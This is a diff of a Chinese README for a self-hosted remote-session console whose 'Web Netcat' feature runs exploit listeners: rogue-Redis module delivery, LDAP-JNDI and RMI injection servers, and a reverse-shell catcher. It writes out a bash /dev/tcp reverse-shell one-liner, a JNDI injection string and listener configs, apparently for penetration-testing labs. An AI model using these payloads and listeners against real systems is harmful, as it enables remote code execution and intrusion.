@@ -1,8 +1,27 @@
 # 远程连接管理器（Remote Connect Manager）
 
+[![Docker Pulls](https://img.shields.io/docker/pulls/hktalent/remote-connect-manager)](https://hub.docker.com/r/hktalent/remote-connect-manager)
+[![Image Size](https://img.shields.io/docker/image-size/hktalent/remote-connect-manager/latest)](https://hub.docker.com/r/hktalent/remote-connect-manager/tags)
+[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+
 一个自托管的 Web 控制台，把分散的 SSH / VNC / RDP / Telnet 目标集中登记成卡片，点击卡片即可直接在浏览器里操作远程会话；每个卡片用该连接最后一次的界面截图作为背景，一眼就能看出每台机器当前的状态。
 
 ![演示](img/demo.jpg)
+
+## 快速开始（Docker）
+
+镜像已发布在 Docker Hub（`linux/amd64`，`latest` / `20261118` 两个 tag，同一 digest `sha256:a2401e22…`），一条命令拉起（RDP / Telnet 另需 `guacd`，见「Docker 构建」）：
+
+```bash
+docker run -d --name remote-connect-manager \
+  -p 8088:8080 \
+  -p 8888:8888 -p 6379:6379 -p 1389:1389 -p 8090:8090 -p 1099:1099 \
+  -e NETCAT_PUBLIC_HOST=192.168.0.135 \
+  -v "$PWD/data:/app/data" \
+  hktalent/remote-connect-manager:latest
+```
+
+打开 <http://localhost:8088> 即用；配置、密钥、截图与 Web Netcat 载荷都落在挂载的 `./data`。
 
 ## 项目介绍
 
@@ -108,6 +127,67 @@ bash -c 'bash -i >& /dev/tcp/<服务端IP>/8888 0>&1'
 #    - http 监听 8081：serve_payload_dir=true，上传 Exploit.class
 #    - 触发点注入 ${jndi:ldap://<服务端IP>:1389/Exploit}
 ```
+
+#### 监听配置字段（`data/netcat.json`）
+
+界面能配的东西都能直接改 JSON（改完刷新页面生效；运行中的监听会按新配置重启）：
+
+```json
+{
+  "listeners": [
+    {
+      "name": "Redis Rogue（6379）",
+      "bind": "0.0.0.0",
+      "port": 6379,
+      "mode": "redis",
+      "auto_start": true,
+      "rules": [
+        { "name": "exp.so 请求", "enabled": true, "match_type": "contains",
+          "pattern": "exp.so", "payload_type": "file", "payload_file": "exp.so",
+          "wrap": "bulk", "delay_ms": 50, "close_after": true },
+        { "name": "PSYNC 复制同步", "enabled": true, "match_type": "contains",
+          "pattern": "PSYNC", "payload_type": "file", "payload_file": "exp.so", "wrap": "bulk" },
+        { "name": "HELLO 探测", "enabled": true, "match_type": "hex",
+          "pattern": "48 45 4c 4c 4f", "payload_type": "text", "payload": "+PONG\r\n" }
+      ]
+    }
+  ]
+}
+```
+
+监听（`listeners[]`）字段：
+
+| 字段 | 说明 |
+| --- | --- |
+| `id` / `name` | 唯一 ID（自动生成）/ 显示名 |
+| `bind` / `port` | 绑定地址（默认 `0.0.0.0`）/ 端口，1-65535，同一端口只能有一个监听 |
+| `mode` | `shell` / `raw` / `redis` / `ldap` / `rmi` / `http` |
+| `auto_start` | 服务启动时自动监听（含容器重启） |
+| `banner` | 连接建立后立即发送的内容，支持 `\n` 转义 |
+| `auto_cmds` | 仅 `shell`：`cmd`、`delay_ms`、`wait_for`（正则，等输出命中再发）、`max_wait_ms`（默认 10 s） |
+| `rules` | 规则数组，见下表；一个监听可挂任意多条，命中互不影响 |
+| `max_conns` / `initial_delay_ms` | 并发连接上限 / 首次发送前延迟 |
+| `java_code_base` / `java_class_name` / `java_factory` | `ldap`：返回给客户端的 CodeBase 与类名，CodeBase 形如 `http://<IP>:<端口>/` |
+| `jndi_ref_address` / `java_serialized_payload` / `ldap_referral` | `ldap`：`javaReferenceAddress` / `javaSerializedData`（base64）/ 非空则返回 Referral（resultCode 10） |
+| `payload` / `payload_file` | `rmi`：收到客户端数据后发送的 base64 载荷或 payload 文件名（文件优先） |
+| `http_status` / `http_content_type` / `http_body` / `serve_payload_dir` | `http`：固定响应，以及是否按请求路径从 payload 目录取文件 |
+
+规则（`rules[]`）字段：
+
+| 字段 | 说明 |
+| --- | --- |
+| `enabled` | 关掉即不参与匹配，配置保留 |
+| `match_type` | `contains`（默认）/ `prefix` / `suffix` / `regex` / `hex` |
+| `pattern` | 特征；`hex` 用空格分隔十六进制字节，如 `00 01 02` |
+| `ignore_case` | 大小写不敏感（对 `contains` / `prefix` / `suffix` / `regex` 生效） |
+| `window` | 参与匹配的滚动窗口字节数，默认 4096；跨 TCP 分片也能命中 |
+| `payload_type` / `payload` / `payload_file` | `text` / `base64` / `file`（文件在 `data/netcat-payloads/`） |
+| `wrap` | 空=原样发送；`bulk`=Redis 批量字符串 `$<len>\r\n<payload>\r\n` |
+| `send_times` | 每条连接最多命中几次，`0`=不限 |
+| `delay_ms` | 命中后延迟多少毫秒再发 |
+| `close_after` | 发送完成后主动断开该连接 |
+
+> 一个监听同时挂「`exp.so` 请求」和「`PSYNC`」两条规则，就是 Redis Rogue 投递模块的标准配法；再加一条 `hex` 规则即可兼容二进制协议探测。
 
 #### 内置 Exp Payload（`payloads/`）
 
@@ -215,6 +295,7 @@ remote-connect-manager/
 │   ├── js/app.js               # 卡片、配置弹窗、密钥弹窗、会话与截图逻辑
 │   └── vendor/                 # xterm / noVNC / guacamole 本地化依赖
 ├── data/                       # 运行时数据（配置、截图、密钥），首次启动自动创建
+├── payloads/                   # 随镜像发布的内置 Exp 载荷（首次启动复制到 data/netcat-payloads/）
 ├── vendor/                     # Go 依赖（离线构建）
 ├── .github/workflows/release.yml  # 推 v* 标签自动编译三平台二进制并发布
 ├── Dockerfile
@@ -273,7 +354,47 @@ GOOS=windows GOARCH=amd64 CGO_ENABLED=0 GOFLAGS=-mod=vendor \
 docker build -t remote-connect-manager:latest .
 ```
 
-多阶段构建：`golang` 镜像里离线编译出静态二进制，再拷进 `debian:bookworm-slim`，镜像内只保留可执行文件、`web/` 与启动脚本。
+多阶段构建：`golang` 镜像里离线编译出静态二进制，再拷进 `debian:bookworm-slim`，镜像内只保留可执行文件、`web/`、`payloads/` 与启动脚本。
+
+#### 打 tag 与推送镜像
+
+```bash
+docker tag remote-connect-manager:latest hktalent/remote-connect-manager:latest
+docker tag remote-connect-manager:latest hktalent/remote-connect-manager:20261118
+
+docker push hktalent/remote-connect-manager:latest
+docker push hktalent/remote-connect-manager:20261118
+```
+
+宿主机连不上 Docker Hub（`registry-1.docker.io` 超时 / 被 reset）时，`docker push` 会失败——推送由 dockerd 发起，不读命令行里的代理环境变量。可绕开守护进程，导出镜像后用 `crane` 经 SOCKS 代理直推：
+
+```bash
+docker save remote-connect-manager:latest | gzip -1 > /tmp/rcm-image.tar.gz
+gunzip -c /tmp/rcm-image.tar.gz > /tmp/rcm-image.tar      # crane 需要未压缩的 OCI tar
+
+HTTPS_PROXY=socks5://127.0.0.1:1081 ALL_PROXY=socks5://127.0.0.1:1081 \
+  crane push /tmp/rcm-image.tar hktalent/remote-connect-manager:latest
+HTTPS_PROXY=socks5://127.0.0.1:1081 \
+  crane tag hktalent/remote-connect-manager:latest 20261118
+```
+
+- 推之前先确认凭据：`crane auth login docker.io -u hktalent`（或沿用 Docker Desktop 已登录的 `~/.docker/config.json`）；可用 `docker-credential-desktop list` 确认 docker.io 条目是否真的存在。
+- 只验通链路不看凭据时，`curl --socks5-hostname 127.0.0.1:1081 -o /dev/null -w '%{http_code}' https://registry-1.docker.io/v2/` 返回 `401` 即说明出口可用。
+
+已发布到 Docker Hub（`linux/amd64`，digest `sha256:a2401e22…`），可直接拉取运行：
+
+```bash
+docker pull hktalent/remote-connect-manager:latest          # 或 :20261118
+
+docker run -d --name remote-connect-manager \
+  -p 8088:8080 \
+  -p 8888:8888 -p 6379:6379 -p 1389:1389 -p 8090:8090 -p 1099:1099 \
+  -e NETCAT_PUBLIC_HOST=192.168.0.135 \
+  -v "$PWD/data:/app/data" \
+  hktalent/remote-connect-manager:latest
+```
+
+> 单容器启动只有 SSH / VNC / Web Netcat 可用；RDP / Telnet 还需要一个 `guacd`（`docker run -d -p 4822:4822 guacamole/guacd:1.5.5`，并设 `GUACD_ADDR`），用 compose 更省事。
 
 ## 使用
 
@@ -300,6 +421,9 @@ compose 会拉起两个容器：
 | `./data/rdp-drive:/tmp/rcm-drive` | 两个容器共用，RDP 共享盘落地目录（浏览器显示下载的文件都在这） |
 | `PORT=8080` | 容器内监听端口 |
 | `GUACD_ADDR=guacd:4822` | RDP / Telnet 使用的 guacd 地址 |
+| `NETCAT_PUBLIC_HOST` | Web Netcat 种子监听里 LDAP `javaCodeBase` 的对外主机，取自 `.env`（默认 `127.0.0.1`，打靶时改成目标机能访问的 IP） |
+| `8888 / 6379 / 1389 / 8090 / 1099` | 内置 exp 监听：反弹 shell / Redis Rogue / LDAP-JNDI / JNDI CodeBase / RMI，换端口时两边同步改 |
+| `9000-9010` | Web Netcat 通用监听区间，自己新建的监听只有落在这个区间（或照样补映射）才能从宿主机访问 |
 | `host.docker.internal:host-gateway` | 让容器能访问宿主机上的虚拟机 / 端口转发 |
 
 改端口只需改 compose 里的 `"8088:8080"` 左侧，例如 `"9090:8080"`。
@@ -368,6 +492,8 @@ GUACD_ADDR=127.0.0.1:4822 ./remote-connect-manager
 | `PORT` | `8080` | HTTP 监听端口 |
 | `GUACD_ADDR` | `127.0.0.1:4822` | guacd 地址，RDP 使用 |
 | `SSH_SCAN_DIR` | `/host-ssh` → `$HOME/.ssh` | 密钥扫描目录 |
+| `NETCAT_PUBLIC_HOST` | `127.0.0.1` | Web Netcat 生成 LDAP `javaCodeBase` 用的对外地址（目标机能访问到的本机 IP） |
+| `NETCAT_PAYLOAD_SEED` | 可执行文件旁的 `payloads/` | 内置 payload 的种子目录，首次启动复制到 `data/netcat-payloads/`（已存在不覆盖） |
 
 ## 配置说明
 
@@ -448,6 +574,8 @@ data/
 | `TUNNEL_PORT_MAX` | `20010` | SSH 端口转发可用区间终点（compose 已映射该区间） |
 | `RCM_DRIVE_PATH` | `/tmp/rcm-drive` | RDP 共享盘目录（同时作为 guacd 的 `drive-path` 与本地下载源） |
 | `SSH_SCAN_DIR` | `/host-ssh` → `$HOME/.ssh` | 启动时扫描导入密钥的目录 |
+| `NETCAT_PUBLIC_HOST` | `127.0.0.1` | LDAP 种子监听里 `javaCodeBase` 的主机部分（`http://<HOST>:8090/`），容器里要设成目标机能访问到的宿主机 IP |
+| `NETCAT_PAYLOAD_SEED` | 可执行文件旁的 `payloads/` | 内置 exp 载荷的种子目录，启动时复制进 `data/netcat-payloads/` |
 | `GIN_MODE` | `debug` | 设为 `release` 关闭调试日志 |
 
 > Web Netcat 的监听端口由每个监听自己配置（1-65535），与 `PORT` 无关；Docker 部署时需要在 compose 里把这些端口映射到宿主机，否则外部连不进来。
@@ -512,6 +640,16 @@ data/
 **卡片背景一直是图标**：说明还没有成功截图，先完整连一次会话（会话中会每 10 秒更新，关闭时会立即更新）。
 
 **端口冲突**：改 `docker-compose.yml` 中 `"8088:8080"` 的宿主机侧端口后 `docker compose up -d`。
+
+**Web Netcat 监听显示「运行中」但外部连不进来**：Docker 部署时端口必须在 `docker-compose.yml` 的 `ports:` 里映射过（默认只有 `8888 / 6379 / 1389 / 8090 / 1099` 和 `9000-9010`），新监听换了别的端口要补一行映射；容器内 `bind` 应为 `0.0.0.0`（填 `127.0.0.1` 只有容器自己能连）。
+
+**规则不触发 / 只触发一次**：确认规则勾了启用、`pattern` 与实际字节一致（Redis 客户端可能发大写、或带 `\r\n`，用 `hex` 或 `ignore_case` 更稳）；命中后匹配窗口会清空，同一段数据不会重复触发，`send_times` 设成 `0` 才是不限次数。
+
+**LDAP / JNDI 注入后目标没回连**：`javaCodeBase` 里的主机不能是 `127.0.0.1`（那是目标机自己），要在 `.env` 里把 `NETCAT_PUBLIC_HOST` 设成目标机能访问到的服务端 IP，`docker compose up -d` 重建生效；同时确认对应的 `http` 监听已启动且 payload 文件确实在 `data/netcat-payloads/`。
+
+**Redis 模块加载失败**：`exp.so` 是 x86-64 Linux ELF，目标架构不符会报 `Module load failed`；投递时规则要选 `wrap: bulk`，否则模块内容不会被当成 RDB/模块数据写入。
+
+**反弹 shell 里终端没反应**：先用 `bash -c 'bash -i >& /dev/tcp/<IP>/<端口> 0>&1'` 验证通路，再检查是否被 `max_conns` 或自动命令集的 `wait_for` 超时卡住（`wait_for` 默认最多等 10 s，超时后也会发送）。
 
 ## 说明
 
